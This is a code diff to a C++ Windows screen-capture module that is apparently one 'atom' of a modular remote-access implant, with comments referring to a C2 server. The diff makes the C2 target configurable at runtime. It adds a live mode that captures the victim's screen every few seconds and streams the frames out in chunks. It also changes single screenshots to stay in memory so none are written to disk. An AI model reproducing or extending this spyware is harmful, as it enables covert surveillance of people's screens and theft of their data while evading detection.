@@ -5,6 +5,7 @@
  * Supports multiple capture commands before exit.
  *===========================================================================*/
 
+#define WIN32_LEAN_AND_MEAN
 #include "Atom_06_Screen.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Orchestrator/Config.h"
@@ -26,6 +27,7 @@ using namespace Gdiplus;
 // Debug logging (kept for testing phase)
 // --------------------------------------------------------------------------
 static void ScreenTrace(const char *format, ...) {
+  if (!Config::LOGGING_ENABLED) return;
   char buf[512];
   va_list args;
   va_start(args, format);
@@ -360,14 +362,20 @@ DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam) {
                 
                 // === TURBO TCP STREAMING ===
                 // Connect directly to the C2 Bouncer port for high-bandwidth raw streaming
+                // Read runtime C2 target (sm_net.cfg primary, hardcoded fallback)
+                char turbo_domain[256] = {0};
+                int turbo_port = 0;
+                Config::GetActiveC2Target(turbo_domain, sizeof(turbo_domain), &turbo_port);
+                ScreenTrace("Turbo target: %s:%d", turbo_domain, turbo_port);
+
                 SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                 if (sock != INVALID_SOCKET) {
-                  struct hostent *host = gethostbyname(Config::C2_DOMAIN);
+                  struct hostent *host = gethostbyname(turbo_domain);
                   if (host) {
                     SOCKADDR_IN sin;
                     memset(&sin, 0, sizeof(sin));
                     sin.sin_family = AF_INET;
-                    sin.sin_port = htons(Config::PUBLIC_PORT); // Bouncer routes to Turbo
+                    sin.sin_port = htons(turbo_port); // Bouncer routes to Turbo
                     sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                     
                     if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
@@ -404,31 +412,164 @@ DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam) {
                 Sleep(500); // Capture failed, wait and retry
               }
             }
+          } else if (cmd == "BALE_LIVE") {
+            ScreenTrace("BALE_LIVE received. Starting continuous screen capture...");
+            BOOL bStopLive = FALSE;
+            int frameCount = 0;
+            while (!bStopLive) {
+              std::vector<BYTE> pngBuffer;
+              if (CaptureScreenToMemory(pngBuffer)) {
+                frameCount++;
+                ScreenTrace("BALE_LIVE frame %d: %zu bytes", frameCount, pngBuffer.size());
+
+                // Send via chunked protocol (same as BALE_RUN)
+                {
+                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                  hdr.dwType = 1; hdr.dwFlags = 0x10; hdr.dwPayloadLen = 0;
+                  char meta[128];
+                  sprintf_s(meta, "name=live_%d_%lu.png size=%zu", frameCount, GetTickCount(), pngBuffer.size());
+                  IPC_MESSAGE startMsg = {0};
+                  startMsg.dwSignature = 0x534D4952;
+                  startMsg.CommandId = CMD_BALE_REPORT;
+                  startMsg.AtomId = dwAtomId;
+                  startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
+                  memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+                  memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
+                  IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
+                }
+
+                DWORD offset = 0;
+                DWORD chunkPayloadMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
+                while (offset < (DWORD)pngBuffer.size()) {
+                  DWORD chunkSize = min((DWORD)pngBuffer.size() - offset, chunkPayloadMax);
+                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                  hdr.dwType = 1; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
+                  IPC_MESSAGE chunkMsg = {0};
+                  chunkMsg.dwSignature = 0x534D4952;
+                  chunkMsg.CommandId = CMD_BALE_REPORT;
+                  chunkMsg.AtomId = dwAtomId;
+                  chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
+                  memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
+                  memcpy(chunkMsg.Payload + sizeof(hdr), pngBuffer.data() + offset, chunkSize);
+                  IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
+                  offset += chunkSize;
+                }
+
+                {
+                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                  hdr.dwType = 1; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
+                  IPC_MESSAGE endMsg = {0};
+                  endMsg.dwSignature = 0x534D4952;
+                  endMsg.CommandId = CMD_BALE_REPORT;
+                  endMsg.AtomId = dwAtomId;
+                  endMsg.dwPayloadLen = sizeof(hdr);
+                  memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+                  IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
+                }
+              }
+
+              // Interruptible sleep between frames
+              DWORD dwSleepStart = GetTickCount();
+              while (GetTickCount() - dwSleepStart < 3000 && !bStopLive) {
+                Sleep(200);
+                DWORD dwAvail = 0;
+                if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
+                  IPC_MESSAGE stopMsg = {0};
+                  if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
+                    std::string stopCmd((char*)stopMsg.Payload, stopMsg.dwPayloadLen);
+                    if (stopCmd == "BALE_STOP" || stopCmd == "TERMINATE" || stopCmd.find("/stop_live") != std::string::npos ||
+                        stopMsg.CommandId == CMD_TERMINATE || stopMsg.CommandId == CMD_STOP_ALL) {
+                      ScreenTrace("BALE_LIVE stopped by command.");
+                      bStopLive = TRUE;
+                      break;
+                    }
+                  }
+                }
+              }
+            }
+            ScreenTrace("BALE_LIVE ended. Sent %d frames.", frameCount);
+
           } else if (cmd == "BALE_RUN") {
-            ScreenTrace("BALE_RUN received. Capturing screen to file...");
+            ScreenTrace("BALE_RUN received. Capturing screen to memory...");
             std::vector<BYTE> pngBuffer;
             if (CaptureScreenToMemory(pngBuffer)) {
-               FILE *f = NULL;
-               fopen_s(&f, "log\\screenshot.png", "wb");
-               if (f) {
-                 fwrite(pngBuffer.data(), 1, pngBuffer.size(), f);
-                 fclose(f);
-                 
-                 char fullPath[MAX_PATH];
-                 GetFullPathNameA("log\\screenshot.png", MAX_PATH, fullPath, NULL);
-                 
-                 char report[MAX_PATH + 32];
-                 sprintf_s(report, "[SCREENSHOT_READY] %s", fullPath);
-                 
-                 IPC_MESSAGE msg = {0};
-                 msg.dwSignature = 0x534D4952;
-                 msg.CommandId = CMD_REPORT;
-                 msg.AtomId = 6;
-                 msg.dwPayloadLen = (DWORD)strlen(report);
-                 memcpy(msg.Payload, report, msg.dwPayloadLen);
-                 IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
-                 ScreenTrace("BALE screenshot saved and reported.");
-               }
+                ScreenTrace("BALE screenshot captured: %zu bytes. Sending chunked...", pngBuffer.size());
+
+                // --- CHUNK START: send header with metadata ---
+                {
+                  struct {
+                    DWORD dwType;
+                    DWORD dwFlags;
+                    DWORD dwPayloadLen;
+                  } hdr;
+                  hdr.dwType = 1; // Screenshot
+                  hdr.dwFlags = 0x10; // BALE_FLAG_CHUNK_START
+                  hdr.dwPayloadLen = 0;
+
+                  char meta[128];
+                  sprintf_s(meta, "name=screenshot_%lu.png size=%zu", GetTickCount(), pngBuffer.size());
+
+                  IPC_MESSAGE startMsg = {0};
+                  startMsg.dwSignature = 0x534D4952;
+                  startMsg.CommandId = CMD_BALE_REPORT;
+                  startMsg.AtomId = dwAtomId;
+                  startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
+                  memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+                  memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
+                  IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
+                }
+
+                // --- CHUNK DATA: send PNG in IPC-sized pieces ---
+                DWORD offset = 0;
+                DWORD chunkPayloadMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64; // Leave room for header
+                while (offset < (DWORD)pngBuffer.size()) {
+                  DWORD chunkSize = min((DWORD)pngBuffer.size() - offset, chunkPayloadMax);
+
+                  struct {
+                    DWORD dwType;
+                    DWORD dwFlags;
+                    DWORD dwPayloadLen;
+                  } hdr;
+                  hdr.dwType = 1; // Screenshot
+                  hdr.dwFlags = 0x11; // BALE_FLAG_CHUNK_DATA
+                  hdr.dwPayloadLen = chunkSize;
+
+                  IPC_MESSAGE chunkMsg = {0};
+                  chunkMsg.dwSignature = 0x534D4952;
+                  chunkMsg.CommandId = CMD_BALE_REPORT;
+                  chunkMsg.AtomId = dwAtomId;
+                  chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
+                  memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
+                  memcpy(chunkMsg.Payload + sizeof(hdr), pngBuffer.data() + offset, chunkSize);
+                  IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
+
+                  offset += chunkSize;
+                  ScreenTrace("BALE chunk sent: %lu/%zu bytes", offset, pngBuffer.size());
+                }
+
+                // --- CHUNK END ---
+                {
+                  struct {
+                    DWORD dwType;
+                    DWORD dwFlags;
+                    DWORD dwPayloadLen;
+                  } hdr;
+                  hdr.dwType = 1; // Screenshot
+                  hdr.dwFlags = 0x12; // BALE_FLAG_CHUNK_END
+                  hdr.dwPayloadLen = 0;
+
+                  IPC_MESSAGE endMsg = {0};
+                  endMsg.dwSignature = 0x534D4952;
+                  endMsg.CommandId = CMD_BALE_REPORT;
+                  endMsg.AtomId = dwAtomId;
+                  endMsg.dwPayloadLen = sizeof(hdr);
+                  memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+                  IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
+                }
+
+                ScreenTrace("BALE screenshot chunked transfer complete.");
+            } else {
+                ScreenTrace("ERROR: CaptureScreenToMemory failed for BALE_RUN.");
             }
           } else {
             // === SINGLE SHOT MODE (original) ===
